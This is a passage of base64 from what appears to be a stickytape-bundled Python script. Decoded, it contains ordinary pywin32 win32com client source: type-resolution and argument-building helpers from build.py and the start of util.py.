keSBmb3IgaW1tZWRpYXRlIHVzZSBvciB3cml0aW5nIHRvIGdlbmNhY2hlKVxuICAgICAgICBzZWxmLnZ0YWJsZUZ1bmNzID0gW11cbiAgICAgICAgZm9yIGVudHJ5IGluIG1ldGhfbGlzdDpcbiAgICAgICAgICAgIHNlbGYudnRhYmxlRnVuY3MuYXBwZW5kKChlbnRyeS5uYW1lcywgZW50cnkuZGlzcGlkLCBlbnRyeS5kZXNjKSlcblxuXG4jIEEgTGF6eSBkaXNwYXRjaCBpdGVtIC0gYnVpbGRzIGFuIGl0ZW0gb24gcmVxdWVzdCB1c2luZyBpbmZvIGZyb21cbiMgYW4gSVR5cGVDb21wLiAgVGhlIGR5bmFtaWMgbW9kdWxlIG1ha2VzIHRoZSBjYWxsZWQgdG8gYnVpbGQgZWFjaCBpdGVtLFxuIyBhbmQgYWxzbyBob2xkcyB0aGUgcmVmZXJlbmNlcyB0byB0aGUgdHlwZWluZm8gYW5kIHR5cGVjb21wLlxuY2xhc3MgTGF6eURpc3BhdGNoSXRlbShEaXNwYXRjaEl0ZW0pOlxuICAgIHR5cGVuYW1lID0gIkxhenlEaXNwYXRjaEl0ZW0iXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgYXR0ciwgZG9jKTpcbiAgICAgICAgc2VsZi5jbHNpZCA9IGF0dHJbMF1cbiAgICAgICAgRGlzcGF0Y2hJdGVtLl9faW5pdF9fKHNlbGYsIE5vbmUsIGF0dHIsIGRvYywgMClcblxuXG50eXBlU3Vic3RNYXAgPSB7XG4gICAgcHl0aG9uY29tLlZUX0lOVDogcHl0aG9uY29tLlZUX0k0LFxuICAgIHB5dGhvbmNvbS5WVF9VSU5UOiBweXRob25jb20uVlRfVUk0LFxuICAgIHB5dGhvbmNvbS5WVF9IUkVTVUxUOiBweXRob25jb20uVlRfSTQsXG59XG5cblxuZGVmIF9SZXNvbHZlVHlwZSh0eXBlcmVwciwgaXR5cGVpbmZvKTpcbiAgICAjIFJlc29sdmUgVlRfVVNFUkRFRklORUQgKG9mdGVuIGFsaWFzZXMgb3IgdHlwZWQgSURpc3BhdGNoZXMpXG5cbiAgICBpZiB0eXBlKHR5cGVyZXByKSA9PSB0dXBsZTpcbiAgICAgICAgaW5kaXJfdnQsIHN1YnJlcHIgPSB0eXBlcmVwclxuICAgICAgICBpZiBpbmRpcl92dCA9PSBweXRob25jb20uVlRfUFRSOlxuICAgICAgICAgICAgIyBJZiBpdCBpcyBhIFZUX1BUUiB0byBhIFZUX1VTRVJERUZJTkVEIHRoYXQgaXMgYW4gSURpc3BhdGNoL0lVbmtub3duLFxuICAgICAgICAgICAgIyB0aGVuIGl0IHJlc29sdmVzIHRvIHNpbXBseSB0aGUgb2JqZWN0LlxuICAgICAgICAgICAgIyBPdGhlcndpc2UsIGl0IGJlY29tZXMgYSBCeVJlZiBvZiB0aGUgcmVzb2x2ZWQgdHlwZVxuICAgICAgICAgICAgIyBXZSBuZWVkIHRvIGRyb3AgYW4gaW5kaXJlY3Rpb24gbGV2ZWwgb24gcG9pbnRlciB0byB1c2VyIGRlZmluZWQgaW50ZXJmYWNlcy5cbiAgICAgICAgICAgICMgZWcsIChWVF9QVFIsIChWVF9VU0VSREVGSU5FRCwgc29tZWhhbmRsZSkpIG5lZWRzIHRvIGJlY29tZSBWVF9ESVNQQVRDSFxuICAgICAgICAgICAgIyBvbmx5IHdoZW4gInNvbWVoYW5kbGUiIGlzIGFuIG9iamVjdC5cbiAgICAgICAgICAgICMgYnV0IChWVF9QVFIsIChWVF9VU0VSREVGSU5FRCwgb3RoZXJoYW5kbGUpKSBkb2VzbnQgZ2V0IHRoZSBpbmRpcmVjdGlvbiBkcm9wcGVkLlxuICAgICAgICAgICAgd2FzX3VzZXIgPSB0eXBlKHN1YnJlcHIpID09IHR1cGxlIGFuZCBzdWJyZXByWzBdID09IHB5dGhvbmNvbS5WVF9VU0VSREVGSU5FRFxuICAgICAgICAgICAgc3VicmVwciwgc3ViX2Nsc2lkLCBzdWJfZG9jID0gX1Jlc29sdmVUeXBlKHN1YnJlcHIsIGl0eXBlaW5mbylcbiAgICAgICAgICAgIGlmIHdhc191c2VyIGFuZCBzdWJyZXByIGluIFtcbiAgICAgICAgICAgICAgICBweXRob25jb20uVlRfRElTUEFUQ0gsXG4gICAgICAgICAgICAgICAgcHl0aG9uY29tLlZUX1VOS05PV04sXG4gICAgICAgICAgICAgICAgcHl0aG9uY29tLlZUX1JFQ09SRCxcbiAgICAgICAgICAgIF06XG4gICAgICAgICAgICAgICAgIyBEcm9wIHRoZSBWVF9QVFIgaW5kaXJlY3Rpb25cbiAgICAgICAgICAgICAgICByZXR1cm4gc3VicmVwciwgc3ViX2Nsc2lkLCBzdWJfZG9jXG4gICAgICAgICAgICAjIENoYW5nZSBQVFIgaW5kaXJlY3Rpb24gdG8gYnlyZWZcbiAgICAgICAgICAgIHJldHVybiBzdWJyZXByIHwgcHl0aG9uY29tLlZUX0JZUkVGLCBzdWJfY2xzaWQsIHN1Yl9kb2NcbiAgICAgICAgaWYgaW5kaXJfdnQgPT0gcHl0aG9uY29tLlZUX1NBRkVBUlJBWTpcbiAgICAgICAgICAgICMgcmVzb2x2ZSB0aGUgYXJyYXkgZWxlbWVudCwgYW5kIGNvbnZlcnQgdG8gVlRfQVJSQVlcbiAgICAgICAgICAgIHN1YnJlcHIsIHN1Yl9jbHNpZCwgc3ViX2RvYyA9IF9SZXNvbHZlVHlwZShzdWJyZXByLCBpdHlwZWluZm8pXG4gICAgICAgICAgICByZXR1cm4gcHl0aG9uY29tLlZUX0FSUkFZIHwgc3VicmVwciwgc3ViX2Nsc2lkLCBzdWJfZG9jXG4gICAgICAgIGlmIGluZGlyX3Z0ID09IHB5dGhvbmNvbS5WVF9DQVJSQVk6ICAjIHJ1bnRpbWUgaGFzIG5vIHN1cHBvcnQgZm9yIHRoaXMgeWV0LlxuICAgICAgICAgICAgIyByZXNvbHZlIHRoZSBhcnJheSBlbGVtZW50LCBhbmQgY29udmVydCB0byBWVF9DQVJSQVlcbiAgICAgICAgICAgICMgc2hlZXNoIC0gcmV0dXJuIF9zb21ldGhpbmdfXG4gICAgICAgICAgICByZXR1cm4gcHl0aG9uY29tLlZUX0NBUlJBWSwgTm9uZSwgTm9uZVxuICAgICAgICBpZiBpbmRpcl92dCA9PSBweXRob25jb20uVlRfVVNFUkRFRklORUQ6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgcmVzdWx0VHlwZUluZm8gPSBpdHlwZWluZm8uR2V0UmVmVHlwZUluZm8oc3VicmVwcilcbiAgICAgICAgICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yIGFzIGRldGFpbHM6XG4gICAgICAgICAgICAgICAgaWYgZGV0YWlscy5ocmVzdWx0IGluIFtcbiAgICAgICAgICAgICAgICAgICAgd2luZXJyb3IuVFlQRV9FX0NBTlRMT0FETElCUkFSWSxcbiAgICAgICAgICAgICAgICAgICAgd2luZXJyb3IuVFlQRV9FX0xJQk5PVFJFR0lTVEVSRUQsXG4gICAgICAgICAgICAgICAgXTpcbiAgICAgICAgICAgICAgICAgICAgIyBhbiB1bnJlZ2lzdGVyZWQgaW50ZXJmYWNlXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBweXRob25jb20uVlRfVU5LTk9XTiwgTm9uZSwgTm9uZVxuICAgICAgICAgICAgICAgIHJhaXNlXG5cbiAgICAgICAgICAgIHJlc3VsdEF0dHIgPSByZXN1bHRUeXBlSW5mby5HZXRUeXBlQXR0cigpXG4gICAgICAgICAgICB0eXBlS2luZCA9IHJlc3VsdEF0dHIudHlwZWtpbmRcbiAgICAgICAgICAgIGlmIHR5cGVLaW5kID09IHB5dGhvbmNvbS5US0lORF9BTElBUzpcbiAgICAgICAgICAgICAgICB0ZGVzYyA9IHJlc3VsdEF0dHIudGRlc2NBbGlhc1xuICAgICAgICAgICAgICAgIHJldHVybiBfUmVzb2x2ZVR5cGUodGRlc2MsIHJlc3VsdFR5cGVJbmZvKVxuICAgICAgICAgICAgZWxpZiB0eXBlS2luZCBpbiBbcHl0aG9uY29tLlRLSU5EX0VOVU0sIHB5dGhvbmNvbS5US0lORF9NT0RVTEVdOlxuICAgICAgICAgICAgICAgICMgRm9yIG5vdywgYXNzdW1lIExvbmdcbiAgICAgICAgICAgICAgICByZXR1cm4gcHl0aG9uY29tLlZUX0k0LCBOb25lLCBOb25lXG5cbiAgICAgICAgICAgIGVsaWYgdHlwZUtpbmQgPT0gcHl0aG9uY29tLlRLSU5EX0RJU1BBVENIOlxuICAgICAgICAgICAgICAgIGNsc2lkID0gcmVzdWx0VHlwZUluZm8uR2V0VHlwZUF0dHIoKVswXVxuICAgICAgICAgICAgICAgIHJldGRvYyA9IHJlc3VsdFR5cGVJbmZvLkdldERvY3VtZW50YXRpb24oLTEpXG4gICAgICAgICAgICAgICAgcmV0dXJuIHB5dGhvbmNvbS5WVF9ESVNQQVRDSCwgY2xzaWQsIHJldGRvY1xuXG4gICAgICAgICAgICBlbGlmIHR5cGVLaW5kIGluIFtweXRob25jb20uVEtJTkRfSU5URVJGQUNFLCBweXRob25jb20uVEtJTkRfQ09DTEFTU106XG4gICAgICAgICAgICAgICAgIyBYWFggLSBzaG91bGQgcHJvYmFibHkgZ2V0IGRlZmF1bHQgaW50ZXJmYWNlIGZvciBDT19DTEFTUz8/P1xuICAgICAgICAgICAgICAgIGNsc2lkID0gcmVzdWx0VHlwZUluZm8uR2V0VHlwZUF0dHIoKVswXVxuICAgICAgICAgICAgICAgIHJldGRvYyA9IHJlc3VsdFR5cGVJbmZvLkdldERvY3VtZW50YXRpb24oLTEpXG4gICAgICAgICAgICAgICAgcmV0dXJuIHB5dGhvbmNvbS5WVF9VTktOT1dOLCBjbHNpZCwgcmV0ZG9jXG5cbiAgICAgICAgICAgIGVsaWYgdHlwZUtpbmQgPT0gcHl0aG9uY29tLlRLSU5EX1JFQ09SRDpcbiAgICAgICAgICAgICAgICByZXR1cm4gcHl0aG9uY29tLlZUX1JFQ09SRCwgTm9uZSwgTm9uZVxuICAgICAgICAgICAgcmFpc2UgTm90U3VwcG9ydGVkRXhjZXB0aW9uKCJDYW4gbm90IHJlc29sdmUgYWxpYXMgb3IgdXNlci1kZWZpbmVkIHR5cGUiKVxuICAgIHJldHVybiB0eXBlU3Vic3RNYXAuZ2V0KHR5cGVyZXByLCB0eXBlcmVwciksIE5vbmUsIE5vbmVcblxuXG5kZWYgX0J1aWxkQXJnTGlzdChmZGVzYywgbmFtZXMpOlxuICAgICJCdWlsZHMgbGlzdCBvZiBhcmdzIHRvIHRoZSB1bmRlcmx5aW5nIEludm9rZSBtZXRob2QuIlxuICAgICMgV29yZCBoYXMgVHlwZUluZm8gZm9yIEluc2VydCgpIG1ldGhvZCwgYnV0IHNheXMgIm5vIGFyZ3MiXG4gICAgbnVtQXJncyA9IG1heChmZGVzY1s2XSwgbGVuKGZkZXNjWzJdKSlcbiAgICBuYW1lcyA9IGxpc3QobmFtZXMpXG4gICAgd2hpbGUgTm9uZSBpbiBuYW1lczpcbiAgICAgICAgaSA9IG5hbWVzLmluZGV4KE5vbmUpXG4gICAgICAgIG5hbWVzW2ldID0gImFyZyVkIiAlIChpLClcbiAgICAjIFdlXCd2ZSBzZWVuIFwnc291cmNlIHNhZmVcJyBsaWJyYXJpZXMgb2ZmZXIgdGhlIG5hbWUgb2YgXCdyZXRcJyBwYXJhbXMgaW5cbiAgICAjIFwnbmFtZXNcJyAtIGFsdGhvdWdoIHdlIGNhblwndCByZXByb2R1Y2UgdGhpcywgaXQgd291bGQgYmUgaW5zYW5lIHRvIG9mZmVyXG4gICAgIyBtb3JlIGFyZ3MgdGhhbiB3ZSBoYXZlIGFyZyBpbmZvcyBmb3IgLSBoZW5jZSB0aGUgdXBwZXIgbGltaXQgb24gbmFtZXMuLi5cbiAgICBuYW1lcyA9IGxpc3QobWFwKE1ha2VQdWJsaWNBdHRyaWJ1dGVOYW1lLCBuYW1lc1sxIDogKG51bUFyZ3MgKyAxKV0pKVxuICAgIG5hbWVfbnVtID0gMFxuICAgIHdoaWxlIGxlbihuYW1lcykgPCBudW1BcmdzOlxuICAgICAgICBuYW1lcy5hcHBlbmQoImFyZyVkIiAlIChsZW4obmFtZXMpLCkpXG4gICAgIyBBcyBwZXIgQnVpbGRDYWxsTGlzdCgpLCBhdm9pZCBodWdlIGxpbmVzLlxuICAgICMgSGFjayBhICJcXG4iIGF0IHRoZSBlbmQgb2YgZXZlcnkgNXRoIG5hbWUgLSAic3RyaWRlcyIgd291bGQgYmUgaGFuZHlcbiAgICAjIGhlcmUgYnV0IGRvblwndCBleGlzdCBpbiAyLjJcbiAgICBmb3IgaSBpbiByYW5nZSgwLCBsZW4obmFtZXMpLCA1KTpcbiAgICAgICAgbmFtZXNbaV0gPSBuYW1lc1tpXSArICJcXG5cXHRcXHRcXHQiXG4gICAgcmV0dXJuICIsIiArICIsICIuam9pbihuYW1lcylcblxuXG52YWxpZF9pZGVudGlmaWVyX2NoYXJzID0gc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzICsgIl8iXG5cblxuZGVmIGRlbXVuZ2VfbGVhZGluZ191bmRlcnNjb3JlcyhjbGFzc05hbWUpOlxuICAgIGkgPSAwXG4gICAgd2hpbGUgY2xhc3NOYW1lW2ldID09ICJfIjpcbiAgICAgICAgaSArPSAxXG4gICAgYXNzZXJ0IGkgPj0gMiwgIlNob3VsZCBvbmx5IGJlIGhlcmUgd2l0aCBuYW1lcyBzdGFydGluZyB3aXRoIFwnX19cJyJcbiAgICByZXR1cm4gY2xhc3NOYW1lW2kgLSAxIDpdICsgY2xhc3NOYW1lWzogaSAtIDFdXG5cblxuIyBHaXZlbiBhICJwdWJsaWMgbmFtZSIgKGVnLCB0aGUgbmFtZSBvZiBhIGNsYXNzLCBmdW5jdGlvbiwgZXRjKVxuIyBtYWtlIHN1cmUgaXQgaXMgYSBsZWdhbCAoYW5kIHJlYXNvbmFibGUhKSBQeXRob24gbmFtZS5cbmRlZiBNYWtlUHVibGljQXR0cmlidXRlTmFtZShjbGFzc05hbWUsIGlzX2dsb2JhbD1GYWxzZSk6XG4gICAgIyBHaXZlbiBhIGNsYXNzIGF0dHJpYnV0ZSB0aGF0IG5lZWRzIHRvIGJlIHB1YmxpYywgY29udmVydCBpdCB0byBhXG4gICAgIyByZWFzb25hYmxlIG5hbWUuXG4gICAgIyBBbHNvIG5lZWQgdG8gYmUgY2FyZWZ1bCB0aGF0IHRoZSBtdW5naW5nIGRvZXNudFxuICAgICMgY3JlYXRlIGR1cGxpY2F0ZXMgLSBlZywganVzdCByZW1vdmluZyBhIGxlYWRpbmcgIl8iIGlzIGxpa2VseSB0byBjYXVzZVxuICAgICMgYSBjbGFzaC5cbiAgICAjIGlmIGlzX2dsb2JhbCBpcyBUcnVlLCB0aGVuIHRoZSBuYW1lIGlzIGEgZ2xvYmFsIHZhcmlhYmxlIHRoYXQgbWF5XG4gICAgIyBvdmVyd3JpdGUgYSBidWlsdGluIC0gZWcsICJOb25lIlxuICAgIGlmIGNsYXNzTmFtZVs6Ml0gPT0gIl9fIjpcbiAgICAgICAgcmV0dXJuIGRlbXVuZ2VfbGVhZGluZ191bmRlcnNjb3JlcyhjbGFzc05hbWUpXG4gICAgZWxpZiBjbGFzc05hbWUgPT0gIk5vbmUiOlxuICAgICAgICAjIGFzc2lnbiB0byBOb25lIGlzIGV2aWwgKGFuZCBTeW50YXhFcnJvciBpbiAyLjQsIGV2ZW4gdGhvdWdoXG4gICAgICAgICMgaXNrZXl3b3JkIHNheXMgRmFsc2UgdGhlcmUpIC0gbm90ZSB0aGF0IGlmIGl0IHdhcyBhIGdsb2JhbFxuICAgICAgICAjIGl0IHdvdWxkIGdldCBwaWNrZWQgdXAgYmVsb3dcbiAgICAgICAgY2xhc3NOYW1lID0gIk5PTkUiXG4gICAgZWxpZiBpc2tleXdvcmQoY2xhc3NOYW1lKTpcbiAgICAgICAgIyBtb3N0IGtleXdvcmRzIGFyZSBsb3dlciBjYXNlIChleGNlcHQgVHJ1ZSwgRmFsc2UgZXRjIGluIHB5M2spXG4gICAgICAgIHJldCA9IGNsYXNzTmFtZS5jYXBpdGFsaXplKClcbiAgICAgICAgIyBidXQgdGhvc2Ugd2hpY2ggYXJlblwndCBnZXQgZm9yY2VkIHVwcGVyLlxuICAgICAgICBpZiByZXQgPT0gY2xhc3NOYW1lOlxuICAgICAgICAgICAgcmV0ID0gcmV0LnVwcGVyKClcbiAgICAgICAgcmV0dXJuIHJldFxuICAgIGVsaWYgaXNfZ2xvYmFsIGFuZCBoYXNhdHRyKF9fYnVpbHRpbnNfXywgY2xhc3NOYW1lKTpcbiAgICAgICAgIyBidWlsdGlucyBtYXkgYmUgbWl4ZWQgY2FzZS4gIElmIGNhcGl0YWxpemluZyBpdCBkb2VzblwndCBjaGFuZ2UgaXQsXG4gICAgICAgICMgZm9yY2UgdG8gYWxsIHVwcGVyY2FzZSAoZWcsICJOb25lIiwgIlRydWUiIGJlY29tZSAiTk9ORSIsICJUUlVFIlxuICAgICAgICByZXQgPSBjbGFzc05hbWUuY2FwaXRhbGl6ZSgpXG4gICAgICAgIGlmIHJldCA9PSBjbGFzc05hbWU6ICAjIGRpZG5cJ3QgY2hhbmdlIC0gZm9yY2UgYWxsIHVwcGVyY2FzZS5cbiAgICAgICAgICAgIHJldCA9IHJldC51cHBlcigpXG4gICAgICAgIHJldHVybiByZXRcbiAgICAjIFN0cmlwIG5vbiBwcmludGFibGUgY2hhcnNcbiAgICByZXR1cm4gIiIuam9pbihbY2hhciBmb3IgY2hhciBpbiBjbGFzc05hbWUgaWYgY2hhciBpbiB2YWxpZF9pZGVudGlmaWVyX2NoYXJzXSlcblxuXG4jIEdpdmVuIGEgZGVmYXVsdCB2YWx1ZSBwYXNzZWQgYnkgYSB0eXBlIGxpYnJhcnksIHJldHVybiBhIHN0cmluZyB3aXRoXG4jIGFuIGFwcHJvcHJpYXRlIHJlcHIoKSBmb3IgdGhlIHR5cGUuXG4jIFRha2VzIGEgcmF3IEVMRU1ERVNDIGFuZCByZXR1cm5zIGEgcmVwciBzdHJpbmcsIG9yIE5vbmVcbiMgKE5PVEU6IFRoZSBzdHJpbmcgaXRzZWxmIG1heSBiZSBcJyJOb25lIlwnLCB3aGljaCBpcyB2YWxpZCwgYW5kIGRpZmZlcmVudCB0byBOb25lLlxuIyBYWFggLSBUbyBkbzogRGF0ZXMgYXJlIHByb2JhYmx5IHNjcmV3ZWQsIGJ1dCBjYW4gdGhleSBjb21lIGluP1xuZGVmIE1ha2VEZWZhdWx0QXJnUmVwcihkZWZBcmdWYWwpOlxuICAgIHRyeTpcbiAgICAgICAgaW5PdXQgPSBkZWZBcmdWYWxbMV1cbiAgICBleGNlcHQgSW5kZXhFcnJvcjpcbiAgICAgICAgIyBzb21ldGhpbmcgc3RyYW5nZSAtIGFzc3VtZSBpcyBpbiBwYXJhbS5cbiAgICAgICAgaW5PdXQgPSBweXRob25jb20uUEFSQU1GTEFHX0ZJTlxuXG4gICAgaWYgaW5PdXQgJiBweXRob25jb20uUEFSQU1GTEFHX0ZIQVNERUZBVUxUOlxuICAgICAgICAjIHRpbWVzIG5lZWQgc3BlY2lhbCBoYW5kbGluZy4uLlxuICAgICAgICB2YWwgPSBkZWZBcmdWYWxbMl1cbiAgICAgICAgaWYgaXNpbnN0YW5jZSh2YWwsIGRhdGV0aW1lLmRhdGV0aW1lKTpcbiAgICAgICAgICAgICMgVkFSSUFOVCA8LT4gU1lTVEVNVElNRSBjb252ZXJzaW9ucyBhbHdheXMgbG9zZSBhbnkgc3ViLXNlY29uZFxuICAgICAgICAgICAgIyByZXNvbHV0aW9uLCBzbyBqdXN0IHVzZSBhIFwndGltZXR1cGxlXCcgaGVyZS5cbiAgICAgICAgICAgIHJldHVybiByZXByKHR1cGxlKHZhbC51dGN0aW1ldHVwbGUoKSkpXG4gICAgICAgIGlmIHR5cGUodmFsKSBpcyBUaW1lVHlwZTpcbiAgICAgICAgICAgICMgbXVzdCBiZSB0aGUgXCdvbGRcJyBweXdpbnR5cGVzIHRpbWUgb2JqZWN0Li4uXG4gICAgICAgICAgICB5ZWFyID0gdmFsLnllYXJcbiAgICAgICAgICAgIG1vbnRoID0gdmFsLm1vbnRoXG4gICAgICAgICAgICBkYXkgPSB2YWwuZGF5XG4gICAgICAgICAgICBob3VyID0gdmFsLmhvdXJcbiAgICAgICAgICAgIG1pbnV0ZSA9IHZhbC5taW51dGVcbiAgICAgICAgICAgIHNlY29uZCA9IHZhbC5zZWNvbmRcbiAgICAgICAgICAgIG1zZWMgPSB2YWwubXNlY1xuICAgICAgICAgICAgcmV0dXJuIChcbiAgICAgICAgICAgICAgICAicHl3aW50eXBlcy5UaW1lKCglKHllYXIpZCwgJShtb250aClkLCAlKGRheSlkLCAlKGhvdXIpZCwgJShtaW51dGUpZCwgJShzZWNvbmQpZCwwLDAsMCwlKG1zZWMpZCkpIlxuICAgICAgICAgICAgICAgICUgbG9jYWxzKClcbiAgICAgICAgICAgIClcbiAgICAgICAgcmV0dXJuIHJlcHIodmFsKVxuICAgIHJldHVybiBOb25lXG5cblxuZGVmIEJ1aWxkQ2FsbExpc3QoXG4gICAgZmRlc2MsXG4gICAgbmFtZXMsXG4gICAgZGVmTmFtZWRPcHRBcmcsXG4gICAgZGVmTmFtZWROb3RPcHRBcmcsXG4gICAgZGVmVW5uYW1lZEFyZyxcbiAgICBkZWZPdXRBcmcsXG4gICAgaXNfY29tbWVudD1GYWxzZSxcbik6XG4gICAgIkJ1aWxkcyBhIFB5dGhvbiBkZWNsYXJhdGlvbiBmb3IgYSBtZXRob2QuIlxuICAgICMgTmFtZXNbMF0gaXMgdGhlIGZ1bmMgbmFtZSAtIHBhcmFtIG5hbWVzIGFyZSBmcm9tIDEuXG4gICAgbnVtQXJncyA9IGxlbihmZGVzY1syXSlcbiAgICBudW1PcHRBcmdzID0gZmRlc2NbNl1cbiAgICBzdHJ2YWwgPSAiIlxuICAgIGlmIG51bU9wdEFyZ3MgPT0gLTE6ICAjIFNwZWNpYWwgdmFsdWUgdGhhdCBzYXlzICJ2YXIgYXJncyBhZnRlciBoZXJlIlxuICAgICAgICBmaXJzdE9wdEFyZyA9IG51bUFyZ3NcbiAgICAgICAgbnVtQXJncyA9IG51bUFyZ3MgLSAxXG4gICAgZWxzZTpcbiAgICAgICAgZmlyc3RPcHRBcmcgPSBudW1BcmdzIC0gbnVtT3B0QXJnc1xuICAgIGZvciBhcmcgaW4gcmFuZ2UobnVtQXJncyk6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGFyZ05hbWUgPSBuYW1lc1thcmcgKyAxXVxuICAgICAgICAgICAgbmFtZWRBcmcgPSBhcmdOYW1lIGlzIG5vdCBOb25lXG4gICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOlxuICAgICAgICAgICAgbmFtZWRBcmcgPSAwXG4gICAgICAgIGlmIG5vdCBuYW1lZEFyZzpcbiAgICAgICAgICAgIGFyZ05hbWUgPSAiYXJnJWQiICUgKGFyZylcbiAgICAgICAgdGhpc2Rlc2MgPSBmZGVzY1syXVthcmddXG4gICAgICAgICMgU2VlIGlmIHRoZSBJREwgc3BlY2lmaWVkIGEgZGVmYXVsdCB2YWx1ZVxuICAgICAgICBkZWZBcmdWYWwgPSBNYWtlRGVmYXVsdEFyZ1JlcHIodGhpc2Rlc2MpXG4gICAgICAgIGlmIGRlZkFyZ1ZhbCBpcyBOb25lOlxuICAgICAgICAgICAgIyBPdXQgcGFyYW1zIGFsd2F5cyBnZXQgdGhlaXIgc3BlY2lhbCBkZWZhdWx0XG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgdGhpc2Rlc2NbMV0gJiAocHl0aG9uY29tLlBBUkFNRkxBR19GT1VUIHwgcHl0aG9uY29tLlBBUkFNRkxBR19GSU4pXG4gICAgICAgICAgICAgICAgPT0gcHl0aG9uY29tLlBBUkFNRkxBR19GT1VUXG4gICAgICAgICAgICApOlxuICAgICAgICAgICAgICAgIGRlZkFyZ1ZhbCA9IGRlZk91dEFyZ1xuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAjIFVubmFtZWQgYXJnIC0gYWx3YXlzIGFsbG93IGRlZmF1bHQgdmFsdWVzLlxuICAgICAgICAgICAgICAgIGlmIG5hbWVkQXJnOlxuICAgICAgICAgICAgICAgICAgICAjIElzIGEgbmFtZWQgYXJndW1lbnRcbiAgICAgICAgICAgICAgICAgICAgaWYgYXJnID49IGZpcnN0T3B0QXJnOlxuICAgICAgICAgICAgICAgICAgICAgICAgZGVmQXJnVmFsID0gZGVmTmFtZWRPcHRBcmdcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlZkFyZ1ZhbCA9IGRlZk5hbWVkTm90T3B0QXJnXG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgZGVmQXJnVmFsID0gZGVmVW5uYW1lZEFyZ1xuXG4gICAgICAgIGFyZ05hbWUgPSBNYWtlUHVibGljQXR0cmlidXRlTmFtZShhcmdOYW1lKVxuICAgICAgICAjIGluc2FuZWx5IGxvbmcgbGluZXMgd2l0aCBhbiBcJ2VuY29kaW5nXCcgZmxhZyBjcmFzaGVzIHB5dGhvbiAyLjQuMFxuICAgICAgICAjIGtlZXAgNSBhcmdzIHBlciBsaW5lXG4gICAgICAgICMgVGhpcyBtYXkgc3RpbGwgZmFpbCBpZiB0aGUgYXJnIG5hbWVzIGFyZSBpbnNhbmUsIGJ1dCB0aGF0IHNlZW1zXG4gICAgICAgICMgdW5saWtlbHkuICBTZWUgYWxzbyBfQnVpbGRBcmdMaXN0KClcbiAgICAgICAgaWYgKGFyZyArIDEpICUgNSA9PSAwOlxuICAgICAgICAgICAgc3RydmFsID0gc3RydmFsICsgIlxcbiJcbiAgICAgICAgICAgIGlmIGlzX2NvbW1lbnQ6XG4gICAgICAgICAgICAgICAgc3RydmFsID0gc3RydmFsICsgIiMiXG4gICAgICAgICAgICBzdHJ2YWwgPSBzdHJ2YWwgKyAiXFx0XFx0XFx0IlxuICAgICAgICBzdHJ2YWwgPSBzdHJ2YWwgKyAiLCAiICsgYXJnTmFtZVxuICAgICAgICBpZiBkZWZBcmdWYWw6XG4gICAgICAgICAgICBzdHJ2YWwgPSBzdHJ2YWwgKyAiPSIgKyBkZWZBcmdWYWxcbiAgICBpZiBudW1PcHRBcmdzID09IC0xOlxuICAgICAgICBzdHJ2YWwgPSBzdHJ2YWwgKyAiLCAqIiArIG5hbWVzWy0xXVxuXG4gICAgcmV0dXJuIHN0cnZhbFxuXG5cbmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6XG4gICAgcHJpbnQoIlVzZSBcJ21ha2VweS5weVwnIHRvIGdlbmVyYXRlIFB5dGhvbiBjb2RlIC0gdGhpcyBtb2R1bGUgaXMganVzdCBhIGhlbHBlciIpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnd2luMzJjb20vY2xpZW50L3V0aWwucHknLCBiJyIiIkdlbmVyYWwgY2xpZW50IHNpZGUgdXRpbGl0aWVzLlxuXG5UaGlzIG1vZHVsZSBjb250YWlucyB1dGlsaXR5IGZ1bmN0aW9ucywgdXNlZCBwcmltYXJpbHkgYnkgYWR2YW5jZWQgQ09NXG5wcm9ncmFtbWVycywgb3Igb3RoZXIgQ09NIG1vZHVsZXMuXG4iIiJcbmltcG9ydCBweXRob25jb21cbmZyb20gd2luMzJjb20uY2xpZW50IGltcG9ydCBEaXNwYXRjaCwgX2dldF9nb29kX29iamVjdF9cblxuUHlJRGlzcGF0Y2hUeXBlID0gcHl0aG9uY29tLlR5cGVJSURzW3B5dGhvbmNvbS5JSURfSURpc3BhdGNoXVxuXG5cbmRlZiBXcmFwRW51bShvYiwgcmVzdWx0Q0xTSUQ9Tm9uZSk6XG4gICAgIiIiV3JhcCBhbiBvYmplY3QgaW4gYSBWQVJJQU5UIGVudW1lcmF0b3IuXG5cbiAgICBBbGwgVlRfRElTUEFUQ0hzIHJldHVybmVkIGJ5IHRoZSBlbnVtZXJhdG9yIGFyZSBjb252ZXJ0ZWQgdG8gd3JhcHBlciBvYmplY3RzXG4gICAgKHdoaWNoIG1heSBiZSBlaXRoZXIgYSBjbGFzcyBpbnN0YW5jZSwgb3IgYSBkeW5hbWljLkRpc3BhdGNoIHR5cGUgb2JqZWN0KS5cblxuICAgICIiIlxuICAgIGlmIHR5cGUob2IpICE9IHB5dGhvbmNvbS5UeXBlSUlEc1tweXRob25jb20uSUlEX0lFbnVtVkFSSUFOVF06XG4gICAgICAgIG9iID0gb2IuUXVlcnlJbnRlcmZhY2UocHl0aG9uY29tLklJRF9JRW51bVZBUklBTlQpXG4gICAgcmV0dXJuIEVudW1WQVJJQU5UKG9iLCByZXN1bHRDTFNJRClcblxuXG5jbGFzcyBFbnVtZXJhdG9yOlxuICAgICIiIkEgY2xhc3MgdGhhdCBwcm92aWRlcyBpbmRleGVkIGFjY2VzcyBpbnRvIGFuIEVudW1lcmF0b3JcblxuICAgIEJ5IHdyYXBwaW5nIGEgUHlJRW51bSogb2JqZWN0IGluIHRoaXMgY2xhc3MsIHlvdSBjYW4gcGVyZm9ybVxuICAgIG5hdHVyYWwgbG9vcGluZyBhbmQgaW5kZXhpbmcgaW50byB0aGUgRW51bWVyYXRvci5cblxuICAgIExvb3BpbmcgaXMgdmVyeSBlZmZpY2llbnQsIGJ1dCBpdCBzaG91bGQgYmUgbm90ZWQgdGh